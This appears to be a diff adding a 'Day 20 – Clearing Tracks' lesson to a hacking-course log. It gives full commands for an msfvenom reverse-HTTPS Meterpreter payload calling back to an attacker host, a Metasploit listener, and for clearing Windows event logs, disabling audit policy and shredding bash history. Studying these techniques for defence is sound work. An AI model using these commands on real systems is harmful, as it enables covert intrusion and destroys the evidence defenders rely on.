@@ -1447,3 +1447,129 @@ exploit
 **Deliverables**  
 - Full guide: *Day19_Password_Cracking_Guide.docx*  
 
+ 
+# Day 20 – Clearing Tracks
+
+## 📖 Introduction
+
+When attackers gain access to a system, their goal is not only to exploit it but also to **remain undetected**. To achieve this, they use a process known as **clearing tracks**.
+
+- **Why important?** Logs, audit trails, and command histories can reveal malicious activity.
+- **Goal:** Hide presence by erasing, altering, or preventing evidence collection.
+
+Attackers use techniques such as:
+- HTTPS reverse shells
+- Clearing logs
+- Disabling audit policies
+- Secure history deletion
+
+---
+
+## 🔗 HTTPS Reverse Shell
+
+A **reverse shell** makes the victim's machine connect back to the attacker. Using **HTTPS** hides this communication inside normal web traffic (port 443).
+
+### 1. Payload Generation
+
+Using **msfvenom**:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=<Your_IP> LPORT=443 -f exe -o secret.exe
+```
+
+- **Payload:** `windows/meterpreter/reverse_https`
+- **LHOST:** Attacker's IP
+- **LPORT:** Commonly 443 (HTTPS)
+- **-f exe:** Windows executable format
+- **-o secret.exe:** Output file
+
+When executed, the victim initiates a reverse HTTPS session to the attacker.
+
+### 2. Multi/Handler Listener
+
+Attacker sets up listener in Metasploit:
+
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST <Your_IP>
+set LPORT 443
+exploit
+```
+
+---
+
+## 🛡️ Covering Tracks After Exploitation
+
+After access, attackers must erase evidence of their activity.
+
+### 1. Clearing Event Logs (Windows)
+
+In Meterpreter:
+
+```bash
+run event_manager -i
+clearev
+```
+
+- `run event_manager -i` → lists available logs (System, Security, Application)
+- `clearev` → clears logs but raises suspicion (admins may notice tampering)
+
+### 2. Disabling Audit Policies (Windows)
+
+More stealthy than clearing logs is disabling auditing so no new events are logged.
+
+```bash
+execute -f cmd.exe -a "/c auditpol /clear"
+```
+
+- Requires `NT AUTHORITY\SYSTEM` privileges
+- Prevents logs from being generated during attacker's session
+
+### 3. Clearing Shell History (Linux/Unix)
+
+Linux stores command history in `~/.bash_history`. To securely delete it:
+
+```bash
+shred -zu /root/.bash_history
+```
+
+- **shred:** Overwrites file securely
+- **-z:** Final overwrite with zeros
+- **-u:** Delete after overwrite
+
+This prevents forensic recovery of deleted commands.
+
+---
+
+## 📌 Key Takeaways
+
+- **HTTPS Reverse Shells** → Hide malicious traffic in normal HTTPS communication
+- **clearev** → Erases logs but suspicious
+- **auditpol /clear** → Disables auditing, stealthier
+- **shred** → Securely deletes Linux shell history
+- Privilege escalation often required for log clearing
+
+---
+
+## 📝 Summary
+
+In **Day 20 – Clearing Tracks**, we learned how attackers hide their footprints after exploitation:
+
+- Use HTTPS reverse shells for covert communication
+- Clear or disable logs to erase evidence
+- Securely delete Linux shell history
+- Gain high-level privileges to execute these techniques
+
+While these methods may help attackers stay hidden, security professionals can still detect anomalies caused by tampering.
+
+**Defenders should monitor for:**
+- Suspicious absence of logs
+- Disabled audit policies
+- System inconsistencies
+
+---
+
+## ⚠️ Disclaimer
+
+This content is for **educational purposes only**. Understanding these techniques helps security professionals better defend against them. Do not use this information for malicious purposes.
